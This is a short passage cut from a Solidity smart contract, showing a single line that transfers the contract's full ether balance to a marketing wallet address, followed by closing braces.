        (success,) = address(marketingWallet).call{value: address(this).balance}("");

    }

}